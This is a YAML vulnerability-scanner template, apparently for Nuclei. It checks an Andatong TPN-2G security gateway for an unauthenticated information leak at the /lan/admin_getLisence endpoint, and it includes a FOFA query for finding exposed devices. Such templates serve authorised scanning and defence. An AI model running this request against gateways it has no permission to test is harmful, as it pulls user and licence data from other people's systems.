id: poc-yaml-adt-tpn-2g-security-gateway-admin-getlisence-info-leak
info:
  name: 安达通TPN-2G安全网关 admin_getLisence 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露
  metadata:
    finger: TPN-2G安全网关
    fofa: title="TPN-2G" || title="SJW74"
http:
  - method: GET
    path:
      - "{{BaseURL}}/lan/admin_getLisence"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"attr_name\""
          - "\"beginrecord\""
          - "\"user\""
      - type: word
        part: body
        words:
          - "<"
        negative: true
